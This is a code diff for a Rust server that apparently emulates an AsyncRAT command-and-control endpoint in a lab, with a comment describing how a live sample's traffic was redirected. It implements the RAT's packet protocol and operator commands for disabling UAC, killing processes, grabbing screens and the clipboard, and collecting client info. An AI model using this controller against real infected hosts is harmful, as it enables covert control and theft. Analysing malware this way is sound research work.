@@ -1,22 +1,33 @@
-use tokio::net::TcpListener;
-use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt};
+use tokio::{net::TcpListener, io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt}};
+use std::{fs, io::{self, Cursor, Read, Write}, sync::Arc, time::SystemTime, collections::HashMap};
 use flate2::{read::GzDecoder, write::GzEncoder, Compression};
+use native_tls::{Identity, TlsAcceptor as NativeTlsAcceptor};
+use tokio_native_tls::{TlsStream, TlsAcceptor};
 use rmp_serde::{from_slice, to_vec};
 use serde::{Deserialize, Serialize};
+use tokio::sync::{mpsc, Mutex};
 use serde_json::Value;
 use log::{info, error};
-use tokio_native_tls::TlsStream;
-use std::fs::{self, File};
-use std::io::{self, Cursor, Read, Write};
-use std::time::SystemTime;
-use std::sync::Arc;
-use tokio::sync::{mpsc, Mutex};
-use tokio_native_tls::TlsAcceptor;
-use native_tls::{Identity, TlsAcceptor as NativeTlsAcceptor};
 
 /*
-    Run command with openssl to generate a pfx key we can use for TLS 1
+    Run command with openssl to generate a pfx key we can use for TLS
+    cargo install rustls-cert-gen
+    rustls-cert-gen --output certs/ --san 127.0.0.1,localhost
     openssl pkcs12 -export -out identity.pfx -inkey cert.key.pem -in cert.pem -password pass:toor
+
+    Then used mitmproxy to proxy traffic from the machine running the AsyncRAT 
+    to the IP of the host running the rust server, and in fiddler, we are 
+    modifying the GET request the virus makes to pastebin containing the IP 
+    address of the C2 server, and making it 127.0.0.1:4443 (the port that 
+    mitmproxy is listening to)
+
+    mitmproxy --mode reverse:tls://{RUST_SERVER_ADDRESS}:1030 
+        --listen-port 4443 
+        --set ssl_version_client_min=TLS1_2 
+        --set ssl_version_client_max=TLS1_2 
+        --set ssl_version_server_min=TLS1_2
+        --set ssl_version_server_max=TLS1_2 
+        --set ssl_insecure=true
 
 */
 // Configure logging
@@ -73,14 +84,12 @@ enum Command {
     Cbget { message: String },
     Pong { message: String },
     Received,
-    Error { error: String },
+    #[serde(rename = "Error")]
+    CommandError { error: String },
+    ClientInfo { fields: HashMap<String, String> },
 }
 
 impl Command {
-    fn from_value(value: &Value) -> Option<Self> {
-        from_slice(&rmp_serde::to_vec(value).ok()?).ok()
-    }
-
     fn to_packet(&self) -> Value {
         let mut map = serde_json::Map::new();
         match self {
@@ -166,13 +175,22 @@ impl Command {
                 map.insert("Packet".to_string(), Value::String("pong".to_string()));
                 map.insert("Message".to_string(), Value::String(message.clone()));
             }
-            Command::Received => {map.insert("Packet".to_string(), Value::String("Received".to_string()));},
-            Command::Error { error } => {
+            Command::Received => {
+                map.insert("Packet".to_string(), Value::String("Received".to_string()));
+            },
+            Command::ClientInfo { fields} => { 
+                for (command, val) in fields.iter() {
+                    map.insert(command.clone(), Value::String(val.clone()));
+                }
+            },
+            Command::CommandError { error } => {
                 map.insert("Packet".to_string(), Value::String("Error".to_string()));
                 map.insert("Error".to_string(), Value::String(error.clone()));
-            }
+            },
         };
-        Value::Object(map)
+        let val = Value::Object(map);
+        log::info!("Packet To Send: {val:#?}");
+        val
     }
 
     fn from_input(input: &str) -> Option<Self> {
@@ -185,6 +203,7 @@ impl Command {
             "uacoff" => Some(Command::Uacoff),
             "killps" => parts.get(1).map(|ps| Command::Killps { ps: ps.to_string() }),
             "resethosts" => Some(Command::Resethosts),
+            "getcb" => parts.get(1).map(|cb| Command::Cbget { message: cb.to_string() }),
             "weburl" => {
                 if parts.len() >= 3 {
                     Some(Command::Weburl {
@@ -245,6 +264,56 @@ impl Command {
     }
 }
 
+impl TryFrom<&Value> for Command {
+    type Error = String;
+    
+    fn try_from(value: &Value) -> Result<Self, Self::Error> {
+        let obj = value.as_object().ok_or("Expected JSON object")?;
+
+        let packet = obj
+            .get("Packet")
+            .and_then(Value::as_str)
+            .ok_or("Missing or invalid 'Packet' field")?
+            .to_lowercase();
+
+        match packet.as_str() {
+            "ping" => {
+                let message = obj.get("Message")
+                    .and_then(Value::as_str)
+                    .unwrap_or("")
+                    .to_string();
+
+                Ok(Command::Pong { message })
+            }
+
+            "gettxt" => Ok(Command::Gettxt),
+
+            "loge" => {
+                let id = obj.get("ID")
+                    .and_then(Value::as_str)
+                    .unwrap_or("")
+                    .to_string();
+
+                Ok(Command::Loge { id })
+            }
+
+            "clientinfo" => {
+                let mut fields = HashMap::new();
+                for (k, v) in obj {
+                    if let Some(s) = v.as_str() {
+                        fields.insert(k.clone(), s.to_string());
+                    }
+                }
+                Ok(Command::ClientInfo { fields })
+            }
+
+            other => Err(format!("Unrecognized Packet type: {:?}", other)),
+        }
+    }
+
+}
+
+
 async fn handle_stdin(tx: mpsc::UnboundedSender<Command>) {
     let mut reader = BufReader::new(tokio::io::stdin());
     let mut line = String::new();
@@ -275,12 +344,12 @@ async fn handle_stdin(tx: mpsc::UnboundedSender<Command>) {
 }
 
 async fn handle_client(
-    mut stream: TlsStream<tokio::net::TcpStream>,
+    stream: TlsStream<tokio::net::TcpStream>,
     addr: std::net::SocketAddr,
     rx: Arc<Mutex<mpsc::UnboundedReceiver<Command>>>,
 ) {
     info!("New connection from {}", addr);
-
+    let (mut reader, mut writer) = tokio::io::split(stream);
     let mut full_data = Vec::new();
     let mut buffer = [0u8; 4096];
 
@@ -289,7 +358,7 @@ async fn handle_client(
 
         tokio::select! {
             // Receive TCP stream data
-            result = stream.read(&mut buffer) => {
+            result = reader.read(&mut buffer) => {
                 match result {
                     Ok(0) => {
                         info!("Connection closed by {}", addr);
@@ -297,7 +366,7 @@ async fn handle_client(
                     }
                     Ok(n) => {
                         let data = &buffer[..n];
-                        info!("Raw packet from {}: {}", addr, hex::encode(data));
+                        log::debug!("Raw packet from {}: {}", addr, hex::encode(data));
 
                         // Search for GZIP magic bytes (1f 8b 08)
                         let gzip_start = data.windows(3).position(|w| w == [0x1f, 0x8b, 0x08]);
@@ -318,7 +387,7 @@ async fn handle_client(
                             decoder.read_to_end(&mut out).map(|_| out)
                         } {
                             Ok(d) => {
-                                info!("Decompressed {} bytes from {}", d.len(), addr);
+                                log::debug!("Decompressed {} bytes from {}", d.len(), addr);
                                 d
                             }
                             Err(e) => {
@@ -331,39 +400,36 @@ async fn handle_client(
                         let parsed_json: Result<Value, _> = from_slice(&decompressed);
                         let output = match parsed_json {
                             Ok(json_val) => {
-                                match Command::from_value(&json_val) {
-                                    Some(cmd) => format!("Parsed Command: {:?}", cmd),
-                                    None => format!("Unrecognized Command JSON: {}", json_val),
+                                match Command::try_from(&json_val) {
+                                    Ok(cmd) => {
+                                        info!("{cmd:#?}");
+                                        format!("Parsed Command: {:?}", cmd)
+                                    },
+                                    Err(e) => {
+                                        log::error!("{e:?}");
+                                        format!("Unrecognized Command JSON: {}", json_val)
+                                    },
                                 }
                             }
                             Err(e) => format!("Failed to parse MessagePack: {}", e),
                         };
 
-                        info!(
+                        log::debug!(
                             "Packet from {}:\nText: {}\nDecompressed: {}",
                             addr,
                             String::from_utf8_lossy(&decompressed),
                             output
                         );
 
-                        // Send a default response (e.g., Gettxt)
-                        let response = Command::Gettxt.to_packet();
+                        let response = Command::Getscreen.to_packet();
+                        let msgpack_data = to_vec(&response).expect("Serialization failed");
                         let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
-                        if let Err(e) = encoder.write_all(&to_vec(&response).expect("Serialization failed")) {
-                            error!("Compression write error: {}", e);
-                            continue;
-                        }
-                        let mut compressed_response = match encoder.finish() {
-                            Ok(r) => r,
-                            Err(e) => {
-                                error!("Compression finish error: {}", e);
-                                continue;
-                            }
-                        };
+                        encoder.write_all(&msgpack_data).expect("Compression failed");
+                        let mut compressed_response = encoder.finish().expect("Finish compression failed");
                         let mut prefixed_response = vec![0x03, 0x00, 0x00];
                         prefixed_response.append(&mut compressed_response);
 
-                        if let Err(e) = stream.write_all(&prefixed_response).await {
+                        if let Err(e) = writer.write_all(&prefixed_response).await {
                             error!("Failed to send response to {}: {}", addr, e);
                         } else {
                             info!("Sent Gettxt response to {}", addr);
@@ -380,24 +446,14 @@ async fn handle_client(
             result = rx.recv() => {
                 if let Some(cmd) = result {
                     let json_packet = cmd.to_packet();
+                    let msgpack_data = to_vec(&json_packet).expect("Serialization failed");
                     let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
-                    if let Err(e) = encoder.write_all(&to_vec(&json_packet).expect("Serialization failed")) {
-                        error!("Failed to write compression stream: {}", e);
-                        continue;
-                    }
-
-                    let mut compressed = match encoder.finish() {
-                        Ok(c) => c,
-                        Err(e) => {
-                            error!("Failed to finish compression: {}", e);
-                            continue;
-                        }
-                    };
-
+                    encoder.write_all(&msgpack_data).expect("Compression failed");
+                    let mut compressed = encoder.finish().expect("Finish compression failed");
                     let mut packet = vec![0x03, 0x00, 0x00];
                     packet.append(&mut compressed);
 
-                    if let Err(e) = stream.write_all(&packet).await {
+                    if let Err(e) = writer.write_all(&packet).await {
                         error!("Error sending command to {}: {}", addr, e);
                     } else {
                         info!("Sent command to {}: {:?}", addr, cmd);
@@ -431,7 +487,7 @@ async fn handle_client(
         Err(e) => format!("MessagePack parse error: {}", e),
     };
 
-    info!(
+    log::debug!(
         "Connection {} closed.\nHex: {}\nText: {}\nDecompressed JSON: {}",
         addr, hex_full, text_full, final_parsed
     );
@@ -455,11 +511,14 @@ async fn main() -> io::Result<()> {
         }
     });
 
-    // Load your PKCS12 identity (use `openssl` to convert PEM to PFX/PKCS12 if needed)
-    let identity = load_identity("certs/identity.pfx", "toor").unwrap();
+    let identity = load_identity("certsOld/identity.pfx", "toor").unwrap();
 
     // Create native_tls acceptor
-    let native_acceptor = NativeTlsAcceptor::builder(identity).build().unwrap();
+    let native_acceptor = NativeTlsAcceptor::builder(identity)
+        .max_protocol_version(Some(native_tls::Protocol::Tlsv12))
+        .min_protocol_version(Some(native_tls::Protocol::Tlsv12))
+        .build()
+        .unwrap();
 
     // Wrap in tokio's async acceptor
     let acceptor = TlsAcceptor::from(native_acceptor);
